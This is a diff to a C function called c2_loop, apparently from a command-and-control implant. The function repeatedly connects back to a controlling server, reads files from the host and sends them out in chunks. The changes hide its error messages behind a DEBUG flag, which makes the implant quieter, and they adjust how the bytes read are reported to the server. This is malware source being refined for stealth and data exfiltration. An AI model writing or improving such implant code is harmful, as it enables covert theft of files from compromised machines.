@@ -60,13 +60,17 @@ void c2_loop() {
     while (1) {
 
     if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+        #ifdef DEBUG
         fprintf(stderr, "could not create socket\n");
+        #endif
         sleep(sleepy_time);
         c2_loop();
     }
 
     if (connect(sock, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
+        #ifdef DEBUG
         fprintf(stderr, "[!] Could not connect to server...\n");
+        #endif
         sleep(sleepy_time);
         c2_loop();
     }
@@ -101,13 +105,17 @@ void c2_loop() {
 
         // create new socket to send response based on parsed data.
         if ((sock2 = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+            #ifdef DEBUG
             fprintf(stderr, "could not create socket\n");
+            #endif
             sleep(sleepy_time);
             c2_loop();
         }
 
         if (connect(sock2, (struct sockaddr*)&server_address, sizeof(server_address)) < 0) {
+            #ifdef DEBUG
             fprintf(stderr, "[!] Could not connect to server...\n");
+            #endif
             sleep(sleepy_time);
             c2_loop();
         }
@@ -169,9 +177,11 @@ void c2_loop() {
                 char *data = (char *)malloc(stats.st_size);
                 memset(data, 0, stats.st_size);
 
-                fread(data, sizeof(payload[0]), stats.st_size, fd);
+                int res = fread(data, sizeof(payload[0]), stats.st_size, fd);
+                #ifdef DEBUG
+                printf("Bytes read %d out of %d\n", res, stats.st_size);
+                #endif
                 fclose(fd);
-
                 // chunking of large files
                 if (stats.st_size > 65535) {
                     int remainder = (stats.st_size / 65535);
@@ -183,7 +193,7 @@ void c2_loop() {
                         free(tmp_buffer);
                     }
                 } else {
-                    build_c2_response(data, cmd_id, sock2);
+                    build_c2_response2(data, res, cmd_id, sock2);
                 }
                 free(data);
             } else {
